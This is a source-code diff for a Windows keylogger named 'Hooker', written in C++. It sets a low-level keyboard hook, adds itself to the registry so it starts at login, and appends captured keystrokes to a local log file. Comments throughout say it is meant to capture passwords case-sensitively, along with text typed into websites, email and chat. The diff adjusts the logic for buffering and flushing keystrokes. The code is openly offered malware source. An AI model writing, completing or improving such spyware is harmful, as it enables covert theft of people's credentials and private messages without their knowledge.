@@ -1,6 +1,4 @@
-
 #include "HookerHead.h"
-
 using namespace std;
 string str = "";
 LSTATUS registryAddingStatus;
@@ -8,16 +6,16 @@ const string logFileName = "HookerLogs.txt";
 LPCSTR hookerRegistryName = "Hooker";
 static bool capsLockPressed = false;
 static bool isShiftPress = false;
+int const maxAllowedStringLenght = 100;
 ofstream outStream;
 int fileOpenMode = (int)ios_base::app; //open existing file. Do not overide it !
-const int maxAllowedStringLenght = 50;
 HHOOK hHook = NULL;
 const int bufferSize = 300;
-
+UINT callbackCallTime = 1000 * 10; // in miliseconds
 INT WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	PSTR lpCmdLine, INT nCmdShow) { // Windows Application running in the phone.
 	//You can spot this in processes int command prompt
-
+	outStream.open(logFileName, fileOpenMode);
 	bool isRegisterAdded = CheckIfRegistryKeyExist(hookerRegistryName); // Do not add new record in the registers
 	if (!isRegisterAdded) {
 		//Try to add new key in register in the HKEY_LOCAL_MACHINE - it will apply
@@ -32,14 +30,15 @@ INT WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	
 	//Define the keyboard hook
 	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HoockCallback, NULL, 0);
+	
 	if (hHook == NULL) {
 	}
 	//Infinite loop to keep the programe live and wait for keyboard event
-	while (GetMessage(NULL,NULL,0,0))
+	while (GetMessage(NULL, NULL, 0, 0))
 	{
 
 	}
-	outStream.open(logFileName,fileOpenMode);
+	
 	outStream.close();
 
 	return 0;
@@ -81,6 +80,9 @@ void ProcessEvent(char* lpszName,int codeNum, string& str, WPARAM wParam,ofstrea
 	// we need to record the input in more meaningfull format than just chars
 	//if enter is pressed, we can asume that a message or input data are send somewhere - website email chatbox
 	//end we record that 
+	if (str.size() >= maxAllowedStringLenght) {
+		outputSteam << str;
+	}
 	switch (codeNum)
 	{
 	case 20 : //we need to have key sensitiv hook in order to have valid logs for password for example
@@ -92,14 +94,6 @@ void ProcessEvent(char* lpszName,int codeNum, string& str, WPARAM wParam,ofstrea
 		}
 		break;
 	case 32: str += " "; // add emty string 
-		break;
-	case 13: //Enter
-		//Write to the file. Later this will be changed, but for now on enter press write new line		
-		outStream.open(logFileName);
-		outStream <<str;
-		outStream << "\r\n";
-		outStream.close();
-
 		break;
 	case 8: //Backspace
 		//remove the last char of str
@@ -156,3 +150,8 @@ void AddProgramInHKEY_CURRENT_USER(LSTATUS &status) {
 	status = RegSetValueEx(hKey, hookerRegistryName, 0, REG_SZ, (BYTE*)szPath, sizeof(szPath));
 	RegCloseKey(hKey);
 }
+
+
+
+
+
